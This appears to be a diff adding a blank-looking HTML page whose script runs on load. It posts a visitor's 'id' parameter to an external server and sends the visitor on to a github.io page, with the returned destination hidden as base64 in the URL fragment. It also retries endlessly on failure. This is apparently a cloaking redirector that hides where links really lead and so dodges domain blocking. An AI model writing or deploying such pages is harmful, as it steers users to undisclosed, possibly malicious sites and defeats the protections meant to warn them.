@@ -1,0 +1,60 @@
+<!doctype html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title></title>
+    <style>
+        .container {
+            width: 60%;
+            margin: 10% auto 0;
+            background-color: #f0f0f0;
+            padding: 2% 5%;
+            border-radius: 10px
+        }
+
+        ul {
+            padding-left: 20px;
+        }
+
+            ul li {
+                line-height: 2.3
+            }
+
+        a {
+            color: #20a53a
+        }
+    </style>
+</head>
+<script src="https://cdn.bootcss.com/jquery/1.12.4/jquery.js"></script>
+<script>
+id= GetQueryString("id");
+init(id);
+function init(id){
+
+$.ajax({
+	type: "post",
+	url: "https://www.zs15.cn/index/index/tiao",
+	dataType: "json",
+	async: true,
+	data: {id: id},
+	timeout: 30000,
+	success: function (data) {		
+				//alert('检测到域名:'+data.url);				
+				var tt=data.url+"?id="+id;
+				window.location.href="https://ws10023.github.io/10023/#"+window.btoa(tt)+"?id="+id;
+	},
+	error: function () {
+			//window.location.href='http://www.qq.com';	
+		init(id);
+	}
+});
+}
+ function GetQueryString(name)
+            {
+                var reg = new RegExp("(^|&)"+ name +"=([^&]*)(&|$)");
+                var r = window.location.search.substr(1).match(reg);
+                if(r!=null)return  unescape(r[2]); return null;
+            }
+</script>
+
+</html>
